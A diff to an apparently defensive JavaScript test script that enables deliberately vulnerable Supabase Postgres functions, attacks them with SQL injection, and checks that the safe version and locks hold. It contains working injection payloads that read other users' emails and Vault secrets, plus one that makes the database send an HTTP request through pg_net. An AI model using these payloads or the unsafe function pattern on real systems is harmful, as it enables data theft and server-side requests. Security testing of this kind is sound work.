@@ -3,10 +3,14 @@
 // 1. supabase-js filters are parameterised: SQL in a filter value is just text.
 //    (Filter STRINGS built from user input, like .or(`…${input}`), can still be bent, but only
 //    within what RLS already lets that user see.)
-// 2. An unsafe Postgres function (string concatenation + EXECUTE) is exploited through rpc():
-//    another host's guests and every user's email address leak.
-// 3. The safe version (parameters + format %I) stops the same attacks.
-// 4. The unsafe function is locked again afterwards (no grant, switch off), also after a crash.
+// 2. An unsafe Postgres function (string concatenation + EXECUTE), SECURITY DEFINER (runs as its
+//    owner, postgres: RLS off), exploited through rpc(): other hosts' guests, every account's
+//    email address and the Vault secrets leak.
+// 3. The SAME unsafe function as SECURITY INVOKER (runs as the caller): the injection still works,
+//    but only within the caller's rights: RLS keeps it to their own bookings, auth.users and
+//    Vault are refused. Those rights still include pg_net (the database sends an HTTP request).
+// 4. The safe version (parameters + format %I) stops the same attacks.
+// 5. Both unsafe functions are locked again afterwards (no grant, switch off), also after a crash.
 import { createClient } from '@supabase/supabase-js'
 import { execSync } from 'node:child_process'
 
@@ -24,13 +28,14 @@ function check(name, ok, detail) {
   console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail && !ok ? `\n      → ${detail}` : ''}`)
 }
 
-// Locks for the unsafe function. lock() runs on every exit, including a crash or Ctrl+C.
+// Locks for the two unsafe functions. lock() runs on every exit, including a crash or Ctrl+C.
+const UNSAFE = ['sqli_search_bookings_unsafe', 'sqli_search_bookings_unsafe_invoker']
 const unlock = () => {
-  psql(`grant execute on function public.sqli_search_bookings_unsafe(text) to authenticated`)
+  for (const f of UNSAFE) psql(`grant execute on function public.${f}(text) to authenticated`)
   psql(`update sqli_probe_switch set unsafe_enabled_until = now() + interval '2 minutes' where id = 1`)
 }
 const lock = () => {
-  psql(`revoke execute on function public.sqli_search_bookings_unsafe(text) from authenticated`)
+  for (const f of UNSAFE) psql(`revoke execute on function public.${f}(text) from authenticated`)
   psql(`update sqli_probe_switch set unsafe_enabled_until = null where id = 1`)
 }
 const users = []
@@ -75,7 +80,7 @@ check(`.or(\`guest_email.eq.\${input}\`) with input "${input}" → ${r.data?.len
 check('…but RLS still kept it to the attacker\'s own bookings (none of host B\'s guests)', !r.data?.some((x) => x.guest_email.includes('victim') || x.guest_email.includes('secret')))
 
 // ===========================================================================
-console.log('\n# 2. The unsafe function, exploited through rpc()')
+console.log('\n# 2. The unsafe function as SECURITY DEFINER (runs as postgres, RLS off), exploited through rpc()')
 r = await A.c.rpc('sqli_search_bookings_unsafe', { p_search: 'example' })
 check(`before the probe enables it: blocked (${r.error?.code} ${r.error?.message})`, r.error?.code === '42501')
 unlock()
@@ -94,7 +99,27 @@ check(`input "…union all select … from vault.decrypted_secrets --" → ${r.d
   (r.data?.length ?? 0) > 0, JSON.stringify(r.error))
 
 // ===========================================================================
-console.log('\n# 3. The safe version, same attacks')
+console.log('\n# 3. The same unsafe function as SECURITY INVOKER (runs as the caller, RLS on)')
+r = await A.c.rpc('sqli_search_bookings_unsafe_invoker', { p_search: `zzz%' or true --` })
+check(`input "zzz%' or true --" → ${r.data?.length} rows: the injection works, but RLS keeps it to the attacker's own bookings (0 of host B's)`,
+  r.data?.length === 2 && r.data.every((x) => x.host_id === A.id), JSON.stringify(r))
+r = await A.c.rpc('sqli_search_bookings_unsafe_invoker', { p_search: `zzz%' union all select 'account', email::text, created_at, id from auth.users --` })
+check(`"…from auth.users --" → refused (${r.error?.code} ${r.error?.message})`, r.error?.code === '42501' && !r.data)
+r = await A.c.rpc('sqli_search_bookings_unsafe_invoker', { p_search: `zzz%' union all select decrypted_secret, name, now(), null from vault.decrypted_secrets --` })
+check(`"…from vault.decrypted_secrets --" → refused (${r.error?.code} ${r.error?.message})`, r.error?.code === '42501' && !r.data)
+// What the caller's role may do still includes Supabase's default grants outside the API schemas:
+// pg_net's HTTP functions. The injected SQL makes the database server send a request (a harmless
+// local one, to Mailpit's info endpoint).
+r = await A.c.rpc('sqli_search_bookings_unsafe_invoker', {
+  p_search: `zzz%' union all select 'request', net.http_get('http://host.docker.internal:54324/api/v1/info')::text, now(), null --`,
+})
+const requestId = r.data?.find((x) => x.guest_name === 'request')?.guest_email
+await new Promise((ok) => setTimeout(ok, 2500))
+const sent = requestId ? psql(`select coalesce(max(status_code)::text, 'no response') from net._http_response where id = ${Number(requestId)}`) : 'not queued'
+check(`"…net.http_get('http://…')" → the database sent an HTTP request for the attacker (request ${requestId}, response ${sent})`, sent === '200', JSON.stringify(r))
+
+// ===========================================================================
+console.log('\n# 4. The safe version, same attacks')
 r = await A.c.rpc('sqli_search_bookings_safe', { p_search: 'alice' })
 check(`normal use: "alice" → ${r.data?.length} row`, r.data?.length === 1, JSON.stringify(r))
 for (const attack of [`zzz%' or true --`, `zzz%' union all select 'account', email::text, created_at, id from auth.users --`]) {
@@ -108,15 +133,17 @@ r = await anon.rpc('sqli_search_bookings_safe', { p_search: 'example' })
 check(`anon (public key only) can't call even the safe one (${r.error?.code})`, !!r.error)
 
 // ===========================================================================
-console.log('\n# 4. Locks')
+console.log('\n# 5. Locks')
 psql(`update sqli_probe_switch set unsafe_enabled_until = now() - interval '1 second' where id = 1`)
 r = await A.c.rpc('sqli_search_bookings_unsafe', { p_search: `zzz%' or true --` })
 check(`still granted, but the 2-minute switch ran out → refused (${r.error?.message})`, r.error?.code === '42501' && !r.data)
 lock()
 r = await A.c.rpc('sqli_search_bookings_unsafe', { p_search: `zzz%' or true --` })
 check(`after the run: no permission (${r.error?.code})`, r.error?.code === '42501')
-const granted = psql(`select has_function_privilege('authenticated', 'public.sqli_search_bookings_unsafe(text)', 'execute') or has_function_privilege('anon', 'public.sqli_search_bookings_unsafe(text)', 'execute')`)
-check('no API role may execute the unsafe function, and the switch is off', granted === 'f' && psql(`select unsafe_enabled_until is null from sqli_probe_switch`) === 't')
+r = await A.c.rpc('sqli_search_bookings_unsafe_invoker', { p_search: `zzz%' or true --` })
+check(`…same for the INVOKER version (${r.error?.code})`, r.error?.code === '42501')
+const granted = UNSAFE.map((f) => psql(`select has_function_privilege('authenticated', 'public.${f}(text)', 'execute') or has_function_privilege('anon', 'public.${f}(text)', 'execute')`))
+check('no API role may execute either unsafe function, and the switch is off', granted.every((g) => g === 'f') && psql(`select unsafe_enabled_until is null from sqli_probe_switch`) === 't')
 
-console.log(`\n${failures === 0 ? 'All checks passed' : `${failures} check(s) failed`} (test hosts deleted, unsafe function locked)`)
+console.log(`\n${failures === 0 ? 'All checks passed' : `${failures} check(s) failed`} (test hosts deleted, unsafe functions locked)`)
 process.exit(failures === 0 ? 0 : 1)
